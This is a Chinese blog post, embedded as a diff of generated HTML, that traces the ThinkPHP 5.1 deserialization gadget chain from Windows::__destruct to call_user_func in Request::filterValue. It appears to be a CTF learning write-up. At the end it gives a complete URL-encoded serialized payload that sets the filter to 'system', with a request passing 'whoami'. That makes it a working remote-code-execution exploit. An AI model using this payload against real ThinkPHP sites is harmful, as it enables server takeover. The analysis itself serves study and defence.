@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPhp框架反序列化">
+<meta property="og:url" content="http://example.com/2025/05/08/ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="路漫漫其修远兮 吾将上下而求索">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-13-09.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-14-10.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-15-49.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-19-23.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-25-03.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-28-44.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-33-08.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-37-57.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-38-53.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-43-54.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-52-38.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_20-54-21.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_21-17-02.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_21-28-22.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_21-31-19.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_21-32-42.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_21-39-40.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-08_21-44-22.png">
+<meta property="article:published_time" content="2025-05-08T07:16:11.000Z">
+<meta property="article:modified_time" content="2025-05-08T13:57:03.829Z">
+<meta property="article:author" content="Cnext">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Snipaste_2025-05-08_20-13-09.png">
+
+<link rel="canonical" href="http://example.com/2025/05/08/ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ThinkPhp框架反序列化 | 路漫漫其修远兮 吾将上下而求索</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">路漫漫其修远兮 吾将上下而求索</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/08/ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Cnext">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPhp框架反序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-05-08 15:16:11 / 修改时间：21:57:03" itemprop="dateCreated datePublished" datetime="2025-05-08T15:16:11+08:00">2025-05-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <html><head></head><body><h1 id="ThinkPhp框架反序列化漏洞"><a href="/2025/05/08/ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#ThinkPhp框架反序列化漏洞" class="headerlink" title="ThinkPhp框架反序列化漏洞"></a>ThinkPhp框架反序列化漏洞</h1><p><strong>Thinkphp5.1反序列化链的调用</strong></p>
+<h3 id="反序列化的常见的知识"><a href="/2025/05/08/ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#反序列化的常见的知识" class="headerlink" title="反序列化的常见的知识"></a>反序列化的常见的知识</h3><p><strong>反序列化的常见起点</strong></p>
+<p>__wakeup 一定会调用</p>
+<p>__destruct 一定会调用</p>
+<p>__toString 当一个对象被反序列化后又被当做字符串使用</p>
+<p><strong>反序列化的常见中间跳板:</strong></p>
+<p>__toString 当一个对象被当做字符串使用</p>
+<p>__get 读取不可访问或不存在属性时被调用</p>
+<p>__set 当给不可访问或不存在属性赋值时被调用</p>
+<p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</p>
+<p>形如 $this-&gt;$func();</p>
+<p><strong>反序列化的常见终点:</strong></p>
+<p>__call 调用不可访问或不存在的方法时被调用</p>
+<p>call_user_func 一般php代码执行都会选择这里</p>
+<p>call_user_func_array 一般php代码执行都会选择这里</p>
+<p>现在又多了<strong>phar反序列化的利用方式</strong>，能够反序列化其metadata部分，利用的范围增加了许多！</p>
+<p>还是得好好向大佬学习，直接渗透到框架中来了，网上的关于thinkphp反序列化的都看了一遍，建议已经有了php编程基础的和php反序列化基础的深究，脚本小子只需要拿着poc去打就可以了（bushi，我也想从脚本小子慢慢到深究原理，慢慢来吧</p>
+<p>源码是在buuctf中的下载的，自己分析thinkphp的代码，然后找到可以反序列化的地方，执行代码</p>
+<p>有能力的可以用docker自己搭一个环境然后运行这个代码，傻瓜式打法就是phpstudy搭一个环境，直接把源码放到www下运行就可以了</p>
+<p>话不多说，开始分析</p>
+<h3 id="Thinkphp反序列化的分析"><a href="/2025/05/08/ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#Thinkphp反序列化的分析" class="headerlink" title="Thinkphp反序列化的分析"></a>Thinkphp反序列化的分析</h3><p>这一部分，看不看得懂其实无所谓，第一次看我也看不懂，只会跟着大佬调试，不知道他们这一步是为了什么，现在稍稍了解了一些，第一遍看的话千万不要深究，把后面的吃透来再回来看这个可能会更好一些</p>
+<p>按照惯例，找利用的入口，一般用__destruct()</p>
+<p><img src="/images/Snipaste_2025-05-08_20-13-09.png"></p>
+<p>打开源码文件，全局搜索__destruct(),发现有很多文件，</p>
+<p><img src="/images/Snipaste_2025-05-08_20-14-10.png"></p>
+<p>这里我们用到windows.php中的魔术方法，这里作为起点</p>
+<p><img src="/images/Snipaste_2025-05-08_20-15-49.png"></p>
+<p>可以看到，__destruct()函数调用removeFiles函数，按住ctrl跟进removeFiles函数，直接跳转过去，看看有哪些文件调用了这个函数</p>
+<p><img src="/images/Snipaste_2025-05-08_20-19-23.png"></p>
+<p>一个简单的for循环，遍历this-&gt;files数组，检查数组中的每一个元素是不是文件，那么就要求我们构造的poc中，windows类里，有files变量，并且是一个数组</p>
+<p>细心一点，你就会发现进行不下去了，但是，file_exists函数，是一个nb的函数，当传入的参数值是一个对象的时候，files_exists会调用__tostring方法，把这个对象转换成为一个字符串，然后再进行判断，这里又能确定一些东西：</p>
+<p>1.构造的poc中files白能量要是一个数组，数组的元素要是对象</p>
+<p>2.找到__tostring函数，进入下一站，全局搜索</p>
+<p>找到tostring方法在很多文件中，我们这里选择Conversion.php中，</p>
+<p><img src="/images/Snipaste_2025-05-08_20-25-03.png"></p>
+<p>也就是说，我们现在是从windows类中跳到了Conversion类中，那么在poc构造的时候，就要想办法让这两者，通过继承或者是包含，产生一定的关系，要产生关系，这里用到了一个抽象的类</p>
+<p><img src="/images/Snipaste_2025-05-08_20-28-44.png"></p>
+<p><img src="/images/Snipaste_2025-05-08_20-33-08.png"></p>
+<p>pivot类继承了model类</p>
+<p>这里，我们可以将files对象数组，写成pivot对象，这样，pivot是继承model类，不就找到了model类，进而找到了conversion类，从而调用__tostring()函数</p>
+<p>继续</p>
+<p>在Conversion类中，继续跟进</p>
+<p>tojson函数调用toarray方法</p>
+<p><img src="/images/Snipaste_2025-05-08_20-37-57.png"></p>
+<p>继续跟进</p>
+<p>到了难的地方，一个一个的跟踪</p>
+<p><img src="/images/Snipaste_2025-05-08_20-38-53.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//只有当append变量不为空，才能往下，poc中append变量不能为空</span><br><span class="line">if (!empty($this-&gt;append)) {</span><br><span class="line">//开始遍历，并且是键值对，所以我们构造的append变量还得是一个键值对</span><br><span class="line">            foreach ($this-&gt;append as $key =&gt; $name) {</span><br><span class="line">            //判断name是不是数组，我们构造的append的值，要是一个数组</span><br><span class="line">                if (is_array($name)) {</span><br><span class="line">                //到了这里，我们要想办法让代码往下走</span><br><span class="line">                    // 追加关联对象属性</span><br><span class="line">                    $relation = $this-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                    if (!$relation) {</span><br><span class="line">                        $relation = $this-&gt;getAttr($key);</span><br><span class="line">                        if ($relation) {</span><br><span class="line">                            $relation-&gt;visible($name);</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>上面的代码块，到了this-&gt;getRelation(key),无法进行，我们现在需要跳转到另一个类中</p>
+<p><img src="/images/Snipaste_2025-05-08_20-43-54.png"></p>
+<p>这个函数，有三个分支，要让上面的代码往下走，所以if(!$relation)要为真所以relation就要为null，那么就是进入到第三个return</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//这里传过来的$name实际上是键值，要想最后返回为空，前面两个if都不能成立</span><br><span class="line">public function getRelation($name = null){</span><br><span class="line">//第一个if，传过来的参数不能为空，也就要求，构造的POC，键不能为空</span><br><span class="line">    if (is_null($name)) {</span><br><span class="line">        return $this-&gt;relation;</span><br><span class="line">//第二个if，要求，传过来的键，不能在$this-&gt;relation数组中，但是我往上翻，这个类定义的relation变量默认值为空</span><br><span class="line">//所以我们构造的时候，不传系统默认的，应该就没问题</span><br><span class="line">    } elseif (array_key_exists($name, $this-&gt;relation)) {</span><br><span class="line">        return $this-&gt;relation[$name];</span><br><span class="line">    }</span><br><span class="line">    return;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>那么继续</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//如果getRelation($key)为空，那么$relation为空，那么，就可以往下进行                   </span><br><span class="line">                    if (!$relation) {</span><br><span class="line">//这里继续把键值传给getAttr($key)函数，我们进入getAttr($key)函数</span><br><span class="line">					$relation = $this-&gt;getAttr($key);</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/Snipaste_2025-05-08_20-52-38.png"></p>
+<p>在attribute类中找到了getattr函数，可以看到，getattr函数最后一行，就是要返回value的值，继续跟进getData函数</p>
+<p><img src="/images/Snipaste_2025-05-08_20-54-21.png"></p>
+<p>我们来看详细代码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function getData($name = null){</span><br><span class="line">//传过来的键值不为空，所以跳过这个if，进入下一个if</span><br><span class="line">    if (is_null($name)) {</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">//最后POC反序列化后，是进入到这里了，因为这里面我们可以在POC构造一个data变量（键值对），最后根据传过来的键，返回data中对应的值   </span><br><span class="line">//那么，第三个if中，relation为什么不能构造了？</span><br><span class="line">//因为上面说到getRelation()函数要返回空，所以array_key_exists($name, $this-&gt;relation)必须为false</span><br><span class="line">//综上所述，我们这里，在POC中，还需要构造一个data变量，并且也是个键值对的形式，并且键就是传过来的</span><br><span class="line">    } elseif (array_key_exists($name, $this-&gt;data)) {</span><br><span class="line">        return $this-&gt;data[$name];</span><br><span class="line">    } elseif (array_key_exists($name, $this-&gt;relation)) {</span><br><span class="line">        return $this-&gt;relation[$name];</span><br><span class="line">    }</span><br><span class="line">    throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>所以，结论如下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$relation = $this-&gt;getAttr($key) = $this-&gt;getData($name) = $this-&gt;data[$name]</span><br><span class="line">这里的$name，实际在传参时传的是$key，所以在Conversion类中</span><br><span class="line">$relation = this-&gt;data[$key]</span><br></pre></td></tr></tbody></table></figure>
+
+<p>再次回到conversion类</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">                    </span><br><span class="line">if (!empty($this-&gt;append)) {</span><br><span class="line">            foreach ($this-&gt;append as $key =&gt; $name) {         </span><br><span class="line">                if (is_array($name)) {</span><br><span class="line">                    // 追加关联对象属性</span><br><span class="line">                    $relation = $this-&gt;getRelation($key);</span><br><span class="line">                    if (!$relation) {</span><br><span class="line">                        $relation = $this-&gt;getAttr($key);</span><br><span class="line">//$relation = $this-&gt;data[$key]                        </span><br><span class="line">                        if ($relation) {                </span><br><span class="line">//$relation现在的值为data[$key]，所以我们在构造POC时，data中不要又visible，为什么呢</span><br><span class="line">//在php中，如果调用不存在的方法时，会自动调用__call()函数，前提是这个对象实现了或者继承了__call()</span><br><span class="line">//在本例中，如果visible()函数不存在，会把visible和name作为参数传给__call()</span><br><span class="line">//那么关键问题</span><br><span class="line">//是_call()在哪？这里就要引入Request类了，因为，大佬们，通过全局搜索，搜索到了Request类里面有__call()</span><br><span class="line">//怎么和_call()扯上关系?如果$relation = $this-&gt;data[$key] = Request的对象呢？</span><br><span class="line">                            $relation-&gt;visible($name);</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>进入request类</p>
+<p>代码分析，可以看到这个类中，不仅有call方法，还有call_user_func_array(),这个函数一般就是rce的最后一站</p>
+<p>在这里面搜索call_user_func()函数，如下图，所以我们要向RCE，就要控制1466行的call_user_func($filter, $value)，那么就要控制filter和value，但是value始终都会被上面的那个该死的array_unshift()改变，所以我们需要找到调用filterValue()的地方</p>
+<p><img src="/images/Snipaste_2025-05-08_21-17-02.png"></p>
+<p>还是在request类中找到了input方法，但是这个方法中的data还是形参，不可控，再找找调用input的方法</p>
+<p><img src="/images/Snipaste_2025-05-08_21-28-22.png"></p>
+<p>还在Request类中，找到了param()方法，但是这个 param()方法中的name还是形参，还是不可控，再找调用param方法的地方</p>
+<p><img src="/images/Snipaste_2025-05-08_21-31-19.png"></p>
+<p>还在Request类中，找到了isAjax()方法，这里在调用param()方法时，不再是用形参了，我们可以构造了</p>
+<p>所以hook变量那里面，中转，要中转到isAjax()方法，并且我们要构造一个config变量</p>
+<p><img src="/images/Snipaste_2025-05-08_21-32-42.png"></p>
+<p>找到了链的起始位置为isajax，而执行代码的位置为input()函数中的filtervalue函数，把代码汇总</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">//在input()函数中</span><br><span class="line">//通过getData()函数获取用户的get以及post组成的数组，值为data</span><br><span class="line">//这个data会被当做filterValue()函数的第一个参数，并执行函数</span><br><span class="line">    protected function getData(array $data, $name)</span><br><span class="line">    {</span><br><span class="line">        foreach (explode('.', $name) as $val) {</span><br><span class="line">            if (isset($data[$val])) {</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            } else {</span><br><span class="line">                return;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        return $data;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">//这里是对filter对象的的值进行一个赋值，从$filter = $filter ?: $this-&gt;filter</span><br><span class="line">//并且把赋值后的fileter传给filterValue()函数的第三个参数，并执行函数</span><br><span class="line">//所以我们需要构造一个fileter</span><br><span class="line">    protected function getFilter($filter, $default)</span><br><span class="line">    {</span><br><span class="line">        if (is_null($filter)) {</span><br><span class="line">            $filter = [];</span><br><span class="line">        } else {</span><br><span class="line">            $filter = $filter ?: $this-&gt;filter;</span><br><span class="line">            if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) {</span><br><span class="line">                $filter = explode(',', $filter);</span><br><span class="line">            } else {</span><br><span class="line">                $filter = (array) $filter;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $filter[] = $default;</span><br><span class="line"></span><br><span class="line">        return $filter;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">//input()函数之外</span><br><span class="line"></span><br><span class="line">//这里call_user_func($filter, $value)</span><br><span class="line">//call_user_func()的两个参数都来自filterValue()接收的参数</span><br><span class="line">//也就是说用户GET或POST传过来的参数，是call_user_func()的第二个也就是RCE的参数</span><br><span class="line">//POC构造的filter，是call_user_func()的第一个也就是最终执行的危险函数</span><br><span class="line">    private function filterValue(&amp;$value, $key, $filters)</span><br><span class="line">    {</span><br><span class="line">        $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">        foreach ($filters as $filter) {</span><br><span class="line">            if (is_callable($filter)) {</span><br><span class="line">                // 调用函数或者方法过滤</span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            } elseif (is_scalar($value)) {</span><br><span class="line">                if (false !== strpos($filter, '/')) {</span><br><span class="line">                    // 正则过滤</span><br><span class="line">                    if (!preg_match($filter, $value)) {</span><br><span class="line">                        // 匹配不成功返回默认值</span><br><span class="line">                        $value = $default;</span><br><span class="line">                        break;</span><br><span class="line">                    }</span><br><span class="line">                } elseif (!empty($filter)) {</span><br><span class="line">                    // filter函数不存在时, 则使用filter_var进行过滤</span><br><span class="line">                    // filter为非整形值时, 调用filter_id取得过滤id</span><br><span class="line">                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                    if (false === $value) {</span><br><span class="line">                        $value = $default;</span><br><span class="line">                        break;</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        return $value;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其实很多人是蒙的，我第一次看到这也是蒙的，因为这个链本身就很复杂，很多个转点，这里偷一张别人的图好理解</p>
+<p><img src="/images/Snipaste_2025-05-08_21-39-40.png"></p>
+<p>漏洞复现，直接用buuctf在线环境打</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP/public/?s=index/index/hello&amp;ethan=whoami</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//post传参</span><br><span class="line">str=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A5%3A%22ethan%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22calc.exe%22%3Bi%3A1%3Bs%3A4%3A%22calc%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22ethan%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A9%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/Snipaste_2025-05-08_21-44-22.png"></p>
